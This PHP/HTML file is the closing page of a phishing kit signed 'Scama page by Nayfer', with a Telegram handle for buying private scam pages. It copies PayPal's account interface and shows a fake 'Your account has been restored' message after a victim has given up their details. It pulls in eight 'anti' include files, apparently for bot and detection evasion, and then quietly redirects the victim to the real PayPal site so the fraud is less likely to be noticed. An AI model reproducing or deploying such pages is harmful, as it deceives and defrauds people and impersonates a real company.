<?php
/*
Scama page by Nayfer
You want your private scama page ?
contact me on telegram @nayfercrax
*/
include "../anti/anti1.php";
include "../anti/anti2.php"; 
include "../anti/anti3.php"; 
include "../anti/anti4.php"; 
include "../anti/anti5.php"; 
include "../anti/anti6.php"; 
include "../anti/anti7.php"; 
include "../anti/anti8.php"; 
session_start();
?>
<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="assets/pics/favi.ico">
    <link rel="apple-touch-icon" href="assets/pics/favi.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title>PayPal Confirm your account
    </title>
    <base href="../">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/cleave.js/1.0.2/cleave.min.js" integrity="sha512-SvgzybymTn9KvnNGu0HxXiGoNeOi0TTK7viiG0EGn2Qbeu/NFi3JdWrJs2JHiGA1Lph+dxiDv5F9gDlcgBzjfA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <meta name="msapplication-task" content="name=My Account;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="msapplication-task" content="name=Send Money;action-uri=https://www.paypal.com/us/cgi-bin/webscr?cmd=_send-money-transfer&amp;send_method=domestic;icon-uri=https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <meta name="keywords" content="transfer money, email money transfer, international money transfer ">
    <meta name="description" content="Transfer money online in seconds with PayPal money transfer. All you need is an email address.">
    <base href="../">  
    <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="https://www.paypalobjects.com/webstatic/icon/pp64.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
    <meta property="og:image" content="https://www.paypalobjects.com/webstatic/icon/pp258.png">
    <link rel="stylesheet" href="assets/process.css">
  
    <link rel="stylesheet" href="assets/contextualLoginElementalUIv2.css">
  </head>
  <body style="font-family: pp-sans-big-regular,Helvetica Neue,Arial,sans-serif;">
    <input type="checkbox" id="toggleMenu" class="menuToggler">
    <div class="desktopNav" style="color: #fff;">
      <div class="navContainer">
        <a href="javascript:" class="desktopBrand">
        </a>
        <div class="mobileMenu">
          <div class="logoutMobile">
            <a href="javascript:" class="logoutTxtMobile">
              Log Out
            </a>
          </div>
        </div>
        <div class="desktopMenu">
          <nav class="desktopItems">
            <ul class="firstUl">
              <li class="">
                <a href="javascript:" class="linksTxt">
                  Summary     
                </a>
              </li>
              <li class="">
                <a href="javascript:" class="linksTxt">
                  Activity
                </a>
              </li>
              <li class="">
                <a href="javascript:" class="linksTxt">
                  Send &amp; Request
                </a>
              </li>
              <li class="">
                <a href="javascript:" class="linksTxt">Wallet
                </a>
              </li>
              <li class="activeLi">
                <a href="javascript:" class="linksTxt">Help
                </a>
              </li>
            </ul>
            <ul class="secondUl">
              <li class="notifLi">
                <a href="javascript:" class="svgLogo notifTxt">
                  <img src="assets/pics/noti.svg" alt="">
                </a>
              </li>
              <li>
                <a href="javascript:" class="svgLogo settingsTxt">
                  <img src="assets/pics/settings.svg" alt="">
                </a>
              </li>
              <li class="logoutLi">
                <a href="javascript:" class="logoutTxtDesktop">Log Out
                </a>
              </li>
            </ul>
          </nav>
        </div>
      </div>
    </div>
    <div class="mainContainer">
      <div class="hide" id="rotate">
        <div class="spinner">
         
          <div class="processing">...
          </div>
        </div>
        <div class="overlay">
        </div>
      </div>
      <div class="mobileNav">
        <div class="navHeader">
          <div class="blockToggler" id="menu">
            <label class="menuLabel" for="toggleMenu">
              <span>
              </span>
              <div class="menuOpen">Menu
              </div>
              <div class="menuClose">
                Close
              </div>
            </label>
          </div>
        </div>
        <div class="navLogo">
          <a href="javascript:" class="mobileBrand">
          </a>
        </div>
        <ul class="notifUl">
          <li>
            <a class="svgLogo notifTxt">
              <img src="assets/pics/noti.svg" alt="">
            </a>
          </li>
        </ul>
      </div>
      <br>    
      <div class="contents">
        <section class="mainContents" id="process">
       <form action="https://paypal.com" method="post" style="padding:0 20px" novalidate="on">

                    
      <div id="select_three"><!--18752825-->  <div style="padding:20px">
        <img src="assets/pics/success.svg" alt="" width="60">
<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem">Completed</h1><p>Your account has been restored.</p><div>
                       
            
</div>
</div><!--93153562--></div>
            

                <button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next" pa-marked="1">Continue
                </button>
              </form></section></div>
                                               
                    </div>
                  
        
        <div class="legalFooter">
          <ul class="footerGroup">
            <li>
              <a target="_blank" href="#" pa-marked="1">Contact Us
              </a>
            </li>
            <li>
              <a target="_blank" href="#" pa-marked="1">Privacy
              </a>
            </li>
            <li>
              <a target="_blank" href="#" pa-marked="1">Legal
              </a>
            </li>
            <li>
              <a target="_blank" href="#" pa-marked="1">Policy Updates
              </a>
            </li>
            <li>
              <a target="_blank" href="#" pa-marked="1">Worldwide
              </a>
            </li>
          </ul>
        </div>
        <script>
                 setTimeout(function() {
                 window.location.href = "https://www.paypal.com";
                }, 5000);

        </script>
</body></html>